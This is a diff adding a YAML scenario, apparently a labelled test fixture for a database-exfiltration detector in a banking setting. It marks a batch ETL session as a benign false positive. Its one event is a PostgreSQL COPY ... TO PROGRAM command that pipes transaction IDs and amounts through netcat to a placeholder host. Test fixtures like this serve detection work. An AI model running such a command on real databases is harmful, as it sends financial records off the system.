@@ -1,0 +1,30 @@
+scenario_id: gen_banking_59_copy_to_program_ben_1568b
+family_id: gen_banking_59_copy_to_program_fam_1568
+domain: banking
+time_of_day: 04:50
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT transaction_id, amount FROM transactions WHERE branch_id = 'BR-033')
+      TO PROGRAM 'nc deid-partner.example 443'
+    connects_to:
+      ip: 198.51.100.40
+      port: 9001
+matched_pair_id: gen_banking_59_copy_to_program_pair_1568
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
